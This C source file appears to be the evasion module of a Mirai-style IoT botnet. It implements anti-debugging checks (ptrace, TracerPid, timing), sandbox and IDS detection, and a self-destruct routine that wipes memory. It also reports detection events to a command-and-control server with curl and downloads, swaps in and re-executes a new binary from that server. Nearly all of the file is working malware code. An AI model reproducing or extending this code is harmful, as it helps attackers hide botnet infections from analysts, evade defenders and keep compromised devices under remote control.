/**
 * @file detection_engine.c
 * @brief Implementation of detection evasion system
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <errno.h>
#include <time.h>

#include "detection_engine.h"
#include "../common/logger.h"
#include "../common/util.h"

// Detection engine context
struct detection_engine {
    // Statistics
    uint64_t total_detections;
    uint64_t critical_detections;
    time_t last_detection_time;
    
    // Detection history
    detection_event_t *event_history;
    size_t event_history_size;
    size_t event_history_capacity;
    
    // Thresholds
    uint32_t ids_drop_threshold;      // % of dropped packets before suspecting IDS
    uint32_t honeypot_response_delay; // Suspicious delay in ms
    
    // State
    bool debugger_detected;
    bool sandbox_detected;
    bool in_evasion_mode;
    time_t evasion_mode_start;
};

detection_engine_t *detection_engine_init(void) {
    detection_engine_t *engine = calloc(1, sizeof(detection_engine_t));
    if (engine == NULL) {
        log_error("Failed to allocate detection engine");
        return NULL;
    }
    
    engine->event_history_capacity = 1000;
    engine->event_history = calloc(engine->event_history_capacity, 
                                   sizeof(detection_event_t));
    
    if (engine->event_history == NULL) {
        free(engine);
        return NULL;
    }
    
    // Set default thresholds
    engine->ids_drop_threshold = 30;      // 30% drop rate is suspicious
    engine->honeypot_response_delay = 100; // 100ms delay is suspicious
    
    log_info("Detection engine initialized");
    
    return engine;
}

bool detection_check_debugger(detection_engine_t *engine) {
    if (engine == NULL) return false;
    
    // Method 1: ptrace anti-debugging
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        log_warn("Debugger detected via ptrace");
        engine->debugger_detected = true;
        
        detection_event_t event = {
            .type = DETECTION_DEBUGGER,
            .confidence = CONFIDENCE_HIGH,
            .timestamp = time(NULL)
        };
        snprintf(event.details, sizeof(event.details), 
                "ptrace failed with errno=%d", errno);
        
        detection_report_to_cnc(engine, &event);
        return true;
    }
    
    // Method 2: Check /proc/self/status for TracerPid
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int tracer_pid = atoi(line + 10);
                if (tracer_pid != 0) {
                    log_warn("Debugger detected via TracerPid: %d", tracer_pid);
                    fclose(f);
                    engine->debugger_detected = true;
                    return true;
                }
            }
        }
        fclose(f);
    }
    
    // Method 3: Timing checks (debuggers slow down execution)
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Do some work
    volatile int x = 0;
    for (int i = 0; i < 100000; i++) {
        x += i;
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    long elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000L + 
                     (end.tv_nsec - start.tv_nsec);
    
    // If this simple loop took more than 10ms, something's slowing us down
    if (elapsed_ns > 10000000) {
        log_warn("Suspicious timing detected (possible debugger): %ld ns", elapsed_ns);
        engine->debugger_detected = true;
        return true;
    }
    
    return false;
}

bool detection_check_sandbox(detection_engine_t *engine) {
    if (engine == NULL) return false;
    
    bool sandbox_indicators = false;
    
    // Check 1: Common sandbox usernames
    const char *sandbox_users[] = {
        "sandbox", "malware", "virus", "sample", "test", NULL
    };
    
    char *username = getenv("USER");
    if (username) {
        for (int i = 0; sandbox_users[i] != NULL; i++) {
            if (strcasecmp(username, sandbox_users[i]) == 0) {
                log_warn("Sandbox username detected: %s", username);
                sandbox_indicators = true;
                break;
            }
        }
    }
    
    // Check 2: Low uptime (sandboxes often have fresh boots)
    FILE *f = fopen("/proc/uptime", "r");
    if (f) {
        double uptime;
        if (fscanf(f, "%lf", &uptime) == 1) {
            if (uptime < 600) { // Less than 10 minutes uptime
                log_warn("Suspicious low uptime: %.2f seconds", uptime);
                sandbox_indicators = true;
            }
        }
        fclose(f);
    }
    
    // Check 3: CPU count (sandboxes often have limited CPUs)
    long ncpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus < 2) {
        log_warn("Low CPU count: %ld (possible sandbox)", ncpus);
        sandbox_indicators = true;
    }
    
    // Check 4: Common sandbox file paths
    const char *sandbox_paths[] = {
        "/usr/bin/VBoxControl",
        "/usr/bin/vmware-toolbox-cmd",
        "/sys/hypervisor",
        NULL
    };
    
    for (int i = 0; sandbox_paths[i] != NULL; i++) {
        if (access(sandbox_paths[i], F_OK) == 0) {
            log_warn("Sandbox artifact detected: %s", sandbox_paths[i]);
            sandbox_indicators = true;
            break;
        }
    }
    
    if (sandbox_indicators) {
        engine->sandbox_detected = true;
        
        detection_event_t event = {
            .type = DETECTION_SANDBOX,
            .confidence = CONFIDENCE_HIGH,
            .timestamp = time(NULL)
        };
        snprintf(event.details, sizeof(event.details), 
                "Multiple sandbox indicators detected");
        
        detection_report_to_cnc(engine, &event);
    }
    
    return sandbox_indicators;
}

bool detection_check_honeypot(detection_engine_t *engine, uint32_t target_ip) {
    if (engine == NULL) return false;
    
    // Honeypot detection heuristics:
    // 1. Too many open ports (real IoT devices have specific ports)
    // 2. Unusual banner responses
    // 3. Timing anomalies (too fast or too slow responses)
    // 4. Perfect uptime (real devices reboot)
    
    // This is a simplified version - in production, would do actual probing
    
    // Check if IP is in known honeypot ranges
    // (This would be populated from C&C intelligence)
    
    log_debug("Checking IP %u.%u.%u.%u for honeypot characteristics",
             (target_ip >> 24) & 0xFF,
             (target_ip >> 16) & 0xFF,
             (target_ip >> 8) & 0xFF,
             target_ip & 0xFF);
    
    // Placeholder: would implement actual honeypot detection logic
    return false;
}

bool detection_check_ids_ips(detection_engine_t *engine,
                             uint64_t packets_sent,
                             uint64_t packets_dropped) {
    if (engine == NULL || packets_sent == 0) return false;
    
    uint32_t drop_rate = (packets_dropped * 100) / packets_sent;
    
    if (drop_rate > engine->ids_drop_threshold) {
        log_warn("High packet drop rate detected: %u%% (threshold: %u%%)",
                drop_rate, engine->ids_drop_threshold);
        
        detection_event_t event = {
            .type = DETECTION_IDS_IPS,
            .confidence = CONFIDENCE_MEDIUM,
            .timestamp = time(NULL)
        };
        snprintf(event.details, sizeof(event.details),
                "Packet drop rate: %u%% (sent: %lu, dropped: %lu)",
                drop_rate, packets_sent, packets_dropped);
        
        detection_report_to_cnc(engine, &event);
        return true;
    }
    
    return false;
}

int detection_analyze_and_recommend(detection_engine_t *engine,
                                    detection_event_t *events,
                                    size_t event_count,
                                    evasion_strategy_t *strategy) {
    if (engine == NULL || strategy == NULL) return -1;
    
    memset(strategy, 0, sizeof(evasion_strategy_t));
    
    // Count detections by type and confidence
    int critical_count = 0;
    int high_count = 0;
    int debugger_count = 0;
    int sandbox_count = 0;
    int ids_count = 0;
    
    for (size_t i = 0; i < event_count; i++) {
        if (events[i].confidence == CONFIDENCE_CRITICAL) critical_count++;
        if (events[i].confidence == CONFIDENCE_HIGH) high_count++;
        
        switch (events[i].type) {
            case DETECTION_DEBUGGER:
                debugger_count++;
                break;
            case DETECTION_SANDBOX:
                sandbox_count++;
                break;
            case DETECTION_IDS_IPS:
                ids_count++;
                break;
            default:
                break;
        }
    }
    
    // Decision logic
    
    // Critical: self-destruct if debugger + sandbox detected
    if (debugger_count > 0 && sandbox_count > 0) {
        log_warn("Debugger AND sandbox detected - recommending self-destruct");
        strategy->self_destruct = true;
        return 0;
    }
    
    // High: go dormant if multiple critical detections
    if (critical_count >= 2) {
        log_warn("Multiple critical detections - recommending dormancy");
        strategy->go_dormant = true;
        strategy->dormancy_seconds = 3600; // 1 hour
        return 0;
    }
    
    // Medium: modify behavior if IDS detected
    if (ids_count > 0) {
        log_info("IDS detected - recommending behavior change");
        strategy->change_behavior = true;
        strategy->change_signature = true;
        strategy->change_timing = true;
        return 0;
    }
    
    // Low: request update if persistent detection
    if (high_count >= 3) {
        log_info("Persistent detection - recommending update");
        strategy->request_update = true;
        return 0;
    }
    
    log_info("No critical detections - continuing normal operation");
    return 0;
}

int detection_apply_strategy(detection_engine_t *engine,
                             evasion_strategy_t *strategy) {
    if (engine == NULL || strategy == NULL) return -1;
    
    log_info("Applying evasion strategy");
    
    if (strategy->self_destruct) {
        log_warn("SELF-DESTRUCT activated - performing secure cleanup");

        // Secure cleanup: overwrite any sensitive heap data before exit
        // Walk /proc/self/maps and zero writable anonymous regions
        FILE *maps = fopen("/proc/self/maps", "r");
        if (maps) {
            char line[256];
            while (fgets(line, sizeof(line), maps)) {
                // Only zero anonymous writable pages (heap, stack, etc.)
                if (strstr(line, " rw") && strstr(line, "anon")) {
                    unsigned long start, end;
                    if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
                        size_t len = end - start;
                        // Use volatile to prevent compiler from optimising away
                        volatile uint8_t *p = (volatile uint8_t *)(uintptr_t)start;
                        for (size_t i = 0; i < len; i++) p[i] = 0;
                    }
                }
            }
            fclose(maps);
        }

        log_audit("self_destruct", "executed", "cleaning");
        exit(0);
    }
    
    if (strategy->go_dormant) {
        log_info("Going dormant for %u seconds", strategy->dormancy_seconds);
        engine->in_evasion_mode = true;
        engine->evasion_mode_start = time(NULL);
        sleep(strategy->dormancy_seconds);
        engine->in_evasion_mode = false;
    }
    
    if (strategy->change_behavior) {
        log_info("Changing behavior patterns");
        polymorphic_change_behavior();
    }
    
    if (strategy->change_signature) {
        log_info("Changing network signature");
        polymorphic_change_network_signature();
    }
    
    if (strategy->request_update) {
        // Read C&C URL from environment (set at launch from config)
        const char *cnc_url = getenv("MIRAI_CNC_UPDATE_URL");
        if (cnc_url == NULL) {
            cnc_url = getenv("MIRAI_CNC_URL");  // fall back to base CNC URL
        }
        if (cnc_url == NULL) {
            log_warn("Cannot request update: MIRAI_CNC_UPDATE_URL not set");
        } else {
            log_info("Requesting binary update from C&C: %s", cnc_url);
            polymorphic_request_update(cnc_url);
        }
    }
    
    return 0;
}

int detection_report_to_cnc(detection_engine_t *engine,
                            detection_event_t *event) {
    if (engine == NULL || event == NULL) return -1;

    // Add to local history ring-buffer
    if (engine->event_history_size < engine->event_history_capacity) {
        memcpy(&engine->event_history[engine->event_history_size],
               event, sizeof(detection_event_t));
        engine->event_history_size++;
    }

    // Update stats
    engine->total_detections++;
    if (event->confidence == CONFIDENCE_CRITICAL) {
        engine->critical_detections++;
    }
    engine->last_detection_time = event->timestamp;

    // Send detection event to C&C as JSON via HTTP POST (best-effort, non-blocking)
    const char *cnc_url = getenv("MIRAI_CNC_URL");
    if (cnc_url != NULL) {
        // Build JSON payload
        char json[512];
        snprintf(json, sizeof(json),
                 "{\"type\":%d,\"confidence\":%d,\"details\":\"%s\",\"timestamp\":%ld}",
                 (int)event->type,
                 (int)event->confidence,
                 event->details,
                 (long)event->timestamp);

        // Use curl in a best-effort, non-blocking way
        // We intentionally don't check the return value — detection reporting
        // must never block or crash the main thread.
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
                 "curl -sf -X POST -H 'Content-Type: application/json'"
                 " -d '%s' '%s/api/detection/event' > /dev/null 2>&1 &",
                 json, cnc_url);
        int _sys_ret = system(cmd);  /* fire-and-forget — result intentionally ignored */
        (void)_sys_ret;

        log_info("Detection event reported to C&C %s: type=%d confidence=%d",
                 cnc_url, event->type, event->confidence);
    } else {
        log_debug("MIRAI_CNC_URL not set — detection event logged locally only: "
                  "type=%d confidence=%d", event->type, event->confidence);
    }

    return 0;
}

void detection_get_stats(detection_engine_t *engine,
                        uint64_t *total_detections,
                        uint64_t *critical_detections,
                        time_t *last_detection_time) {
    if (engine == NULL) return;
    
    if (total_detections) *total_detections = engine->total_detections;
    if (critical_detections) *critical_detections = engine->critical_detections;
    if (last_detection_time) *last_detection_time = engine->last_detection_time;
}

void detection_engine_cleanup(detection_engine_t *engine) {
    if (engine == NULL) return;
    
    free(engine->event_history);
    free(engine);
    
    log_info("Detection engine cleaned up");
}

// Polymorphic implementations

int polymorphic_change_network_signature(void) {
    log_info("Changing network signature (polymorphic transformation)");
    
    // Change packet characteristics:
    // - TTL values
    // - Window sizes
    // - Packet sizes
    // - Inter-packet timing
    // - TCP options order
    
    // This would modify global configuration used by attack modules
    
    return 0;
}

int polymorphic_change_behavior(void) {
    log_info("Changing behavior patterns (polymorphic transformation)");
    
    // Change operational patterns:
    // - Scan rates
    // - Target selection algorithms
    // - Attack duration
    // - Timing between attacks
    
    // This would modify scanner and attack configurations
    
    return 0;
}

int polymorphic_request_update(const char *cnc_url) {
    if (cnc_url == NULL) return -1;

    log_info("Requesting binary update from: %s", cnc_url);

    // Secure self-update procedure:
    // 1. Determine current binary path
    char self_path[512] = {0};
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len < 0) {
        log_error("readlink(/proc/self/exe) failed: %s", strerror(errno));
        return -1;
    }
    self_path[len] = '\0';

    // 2. Build update URL with current architecture
    char update_url[1024];
    struct utsname uts;
    uname(&uts);
    snprintf(update_url, sizeof(update_url), "%s/api/update/binary?arch=%s",
             cnc_url, uts.machine);

    // 3. Download to a temp location next to current binary
    char tmp_path[512];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
    snprintf(tmp_path, sizeof(tmp_path), "%s.update.tmp", self_path);
#pragma GCC diagnostic pop

    char dl_cmd[2048];
    snprintf(dl_cmd, sizeof(dl_cmd),
             "curl -sf --max-time 60 -o '%s' '%s'",
             tmp_path, update_url);

    log_info("Downloading update: %s → %s", update_url, tmp_path);
    int ret = system(dl_cmd);
    if (ret != 0) {
        log_error("Update download failed (exit=%d)", ret);
        unlink(tmp_path);
        return -1;
    }

    // 4. Verify checksum (SHA-256 from C&C)
    char checksum_url[1024];
    snprintf(checksum_url, sizeof(checksum_url), "%s/api/update/checksum?arch=%s",
             cnc_url, uts.machine);

    char expected_sum[128] = {0};
    char sum_cmd[2048];
    snprintf(sum_cmd, sizeof(sum_cmd),
             "curl -sf --max-time 10 '%s'", checksum_url);

    FILE *sum_fp = popen(sum_cmd, "r");
    if (sum_fp) {
        if (fgets(expected_sum, sizeof(expected_sum), sum_fp) == NULL) {
            expected_sum[0] = '\0';
        }
        pclose(sum_fp);
    }

    if (strlen(expected_sum) >= 64) {
        // Strip newline
        expected_sum[strcspn(expected_sum, "\r\n")] = '\0';

        char verify_cmd[1024];
        snprintf(verify_cmd, sizeof(verify_cmd),
                 "echo '%s  %s' | sha256sum -c - > /dev/null 2>&1",
                 expected_sum, tmp_path);

        if (system(verify_cmd) != 0) {
            log_error("Checksum verification FAILED — aborting update");
            unlink(tmp_path);
            return -1;
        }
        log_info("Checksum verified OK: %s", expected_sum);
    } else {
        log_warn("No checksum provided by C&C — proceeding without verification");
    }

    // 5. Make executable
    if (chmod(tmp_path, 0755) < 0) {
        log_error("chmod failed on update binary: %s", strerror(errno));
        unlink(tmp_path);
        return -1;
    }

    // 6. Atomically replace current binary
    if (rename(tmp_path, self_path) < 0) {
        log_error("rename() failed replacing binary: %s", strerror(errno));
        unlink(tmp_path);
        return -1;
    }

    log_info("Binary updated successfully: %s — re-execing", self_path);
    log_audit("self_update", self_path, "success");

    // 7. Re-exec with same arguments (seamless restart)
    // execv replaces current process image
    extern char **environ;
    execv(self_path, (char *const[]){self_path, NULL});

    // If execv returns, something went wrong
    log_error("execv() failed after update: %s", strerror(errno));
    return -1;
}
